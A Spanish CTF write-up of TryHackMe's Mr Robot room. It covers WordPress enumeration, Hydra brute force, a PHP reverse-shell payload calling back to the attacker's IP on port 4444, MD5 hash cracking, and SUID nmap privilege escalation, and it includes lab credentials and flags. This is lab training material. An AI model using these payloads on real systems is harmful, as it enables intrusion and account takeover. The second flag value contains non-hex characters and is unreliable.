---
title: 'Mr Robot CTF - TryHackMe'
description: 'Writeup de Mr Robot CTF en TryHackMe. Enumeración de WordPress, fuerza bruta con Hydra, reverse shell vía plugin editor y escalada de privilegios con nmap SUID.'
pubDate: 2026-02-21
platform: 'tryhackme'
category: 'rooms'
difficulty: 'medium'
os: 'linux'
language: es
tags:
  ['wordpress', 'hydra', 'brute-force', 'suid', 'nmap', 'robots.txt', 'wpscan']
retired: false
heroImage: '/images/writeups/tryhackme/mrrobot.jpg'
attackVectors: ['web']
techniques: ['T1190', 'T1110.001', 'T1505.003', 'T1548.001']
vulnerabilities: ['weak-credentials', 'suid-abuse', 'wordpress-plugin-upload']
certifications: ['OSCP', 'eJPT']
skillLevel: 'intermediate'
estimatedTime: '2-3 horas'
rating: 4.8
---

# Mr Robot CTF - TryHackMe Writeup

**Dificultad**: Medium
**OS**: Linux
**Plataforma**: TryHackMe
**Temática**: Basada en la serie Mr. Robot

## Introducción

Una de las salas más populares de TryHackMe, inspirada en la serie Mr. Robot. La máquina aloja un WordPress con credenciales débiles. El acceso inicial se consigue mediante fuerza bruta y shell inversa desde el editor de plugins. La escalada de privilegios usa un binario `nmap` con SUID, una técnica clásica.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sV -sC -p- 10.10.x.x -oN mrrobot.txt
```

**Puertos abiertos:**

```
80/tcp  open  http   Apache httpd
443/tcp open  https  Apache httpd
```

El puerto 22 (SSH) está cerrado.

## Enumeración Web

### robots.txt

```bash
curl http://10.10.x.x/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Primera flag:**

```bash
curl http://10.10.x.x/key-1-of-3.txt
# 073403c8a58a1f80d943455fb30724b9
```

**Diccionario para brute-force:**

```bash
wget http://10.10.x.x/fsocity.dic
wc -l fsocity.dic
# 858160 líneas (hay muchas repetidas)

sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic
# 11451 líneas únicas
```

### Enumeración WordPress

```bash
wpscan --url http://10.10.x.x --enumerate u
```

**Usuarios encontrados:** `elliot`

### Brute-force con Hydra

```bash
hydra -l elliot -P fsocity_uniq.dic http-post-form \
  "10.10.x.x/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```

**Credenciales encontradas:** `elliot:ER28-0652`

## Explotación

### Reverse shell via WordPress Plugin Editor

1. Accedemos al panel admin: `http://10.10.x.x/wp-admin`
2. Navegamos a **Appearance → Editor**
3. Editamos el archivo `404.php` del tema activo
4. Insertamos una reverse shell PHP:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.x.x.x/4444 0>&1'"); ?>
```

5. Guardamos y accedemos a cualquier página 404:

```bash
nc -lvnp 4444
curl http://10.10.x.x/asdfasdf
```

**Shell obtenida como `daemon`.**

### Mejora de la shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export TERM=xterm
```

### Segundo flag

```bash
ls /home/robot/
# key-2-of-3.txt  password.raw-md5

cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b

# Crackear el hash MD5
echo "c3fcd3d76192e4007dfb496cca67e13b" | hashcat -m 0 -a 0 - /usr/share/wordlists/rockyou.txt
# abcdefghijklmnopqrstuvwxyz
```

Cambiamos al usuario robot:

```bash
su robot
# Contraseña: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
# 822c73956184f694993bebb3eb32f0pp
```

## Escalada de Privilegios

### Binarios SUID

```bash
find / -perm /4000 -type f 2>/dev/null
```

**Encontrado:**

```
/usr/local/bin/nmap
```

### Versión antigua de nmap - modo interactivo

```bash
nmap --version
# nmap version 3.81

nmap --interactive
```

```
Starting Nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root)
```

### Tercer flag

```bash
cat /root/key-3-of-3.txt
# 04787ddef27c3dee1ee161b21670b4e4
```

## Resumen de flags

| Flag           | Ubicación                    | Método                |
| -------------- | ---------------------------- | --------------------- |
| key-1-of-3.txt | `/key-1-of-3.txt`            | robots.txt            |
| key-2-of-3.txt | `/home/robot/key-2-of-3.txt` | Hash MD5 crackeado    |
| key-3-of-3.txt | `/root/key-3-of-3.txt`       | nmap SUID interactivo |

## Conclusión

Mr Robot CTF enseña un flujo completo de ataque real:

1. **OSINT básico** — robots.txt revela diciconario y flag
2. **Enumeración de CMS** — wpscan identifica usuarios
3. **Brute-force inteligente** — reducir el diccionario antes de atacar
4. **Escalada via SUID** — nmap antiguo con modo interactivo permite escape a shell

| Paso             | Herramienta             |
| ---------------- | ----------------------- |
| Reconocimiento   | nmap, wpscan            |
| Brute-force      | Hydra                   |
| Reverse shell    | PHP en editor WordPress |
| Cracking de hash | hashcat                 |
| Escalada         | nmap SUID interactivo   |

## Recursos

- [GTFOBins - Nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [WPScan Documentation](https://wpscan.com/documentation/)
- [CrackStation - Hash Lookup](https://crackstation.net/)
